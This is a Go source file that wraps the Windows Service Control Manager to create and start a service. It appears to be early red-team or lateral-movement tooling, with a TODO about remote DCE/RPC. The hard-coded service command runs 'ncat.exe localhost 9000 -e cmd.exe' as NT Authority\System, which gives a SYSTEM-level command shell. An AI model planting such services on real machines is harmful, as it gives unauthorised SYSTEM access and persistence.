package service

import (
	"fmt"

	"github.com/hashicorp/go-hclog"
	"golang.org/x/sys/windows"
)

// SCMHandle is a Service Control Manager(SCM) handler
// Reference https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagera
type SCMHandle struct {
	Handle windows.Handle
	Log    hclog.Logger
}

// https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access_rights_for_the_service_control_manager
const (
	SC_MANAGER_CONNECT            = 1
	SC_MANAGER_CREATE_SERVICE     = 2
	SC_MANAGER_ENUMERATE_SERVICE  = 4
	SC_MANAGER_LOCK               = 8
	SC_MANAGER_QUERY_LOCK_STATUS  = 16
	SC_MANAGER_MODIFY_BOOT_CONFIG = 32
	SC_MANAGER_ALL_ACCESS         = 0xf003f
)

// NewSCMHandle connect to SCM database and get a handle
func NewSCMHandle(l hclog.Logger) (*SCMHandle, error) {

	// This connect to local SCM with full access to the database.
	// TODO: Find out how to connect remotely using DCE/RPC
	h, err := windows.OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS)
	if err != nil {
		l.Error("Failed to open SC Manager", err)
		return nil, err
	}

	return &SCMHandle{Handle: h, Log: l}, nil

}

func (scm *SCMHandle) CreateService() (*SvcHandle, error) {
	// TODO: don't hard code the service config
	serviceName, _ := windows.UTF16PtrFromString("TestService")
	serviceExecPath, _ := windows.UTF16PtrFromString(`C:\test-service\ncat.exe localhost 9000 -e cmd.exe`)
	serviceRunOnBehalf, _ := windows.UTF16PtrFromString(`NT Authority\System`)

	svcHandle, err := windows.CreateService(
		scm.Handle,
		serviceName,
		nil,
		windows.SERVICE_ALL_ACCESS,        //
		windows.SERVICE_WIN32_OWN_PROCESS, // https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-a-service
		windows.SERVICE_DEMAND_START,      //
		windows.SERVICE_ERROR_NORMAL,      //
		serviceExecPath,
		nil,
		nil,
		nil,
		serviceRunOnBehalf,
		nil,
	)
	if err != nil {
		scm.Log.Error("Failed to create service", err)
		return nil, err
	}

	scm.Log.Info("Service has been created")
	return &SvcHandle{Handle: svcHandle, Log: scm.Log}, nil
}

func (scm *SCMHandle) Close() error {
	if scm.Handle != 0 {
		err := windows.CloseHandle(scm.Handle)
		if err != nil {
			scm.Log.Error("Failed to close SCM Handler")
			return err
		}
	}

	return nil
}

// SvcHandle is a Service Handlert that can control
// a service depending on the access given during its creation.
type SvcHandle struct {
	Handle windows.Handle
	Log    hclog.Logger
}

const (
	SERVICE_BOOT_START   = 0
	SERVICE_SYSTEM_START = 1
	SERVICE_AUTO_START   = 2
	SERVICE_DEMAND_START = 3
	SERVICE_DISABLED     = 4
)

func (svc *SvcHandle) StartService() error {

	err := windows.StartService(svc.Handle, 0, nil)
	if err != nil {
		fmt.Print("Failed to start the service", err)
		return err
	}
	return nil
}

func (svc *SvcHandle) Close() error {

	if svc.Handle != 0 {
		err := windows.CloseServiceHandle(svc.Handle)
		if err != nil {
			svc.Log.Error("Failed to close the handle", err)
			return err
		}
	}

	return nil
}
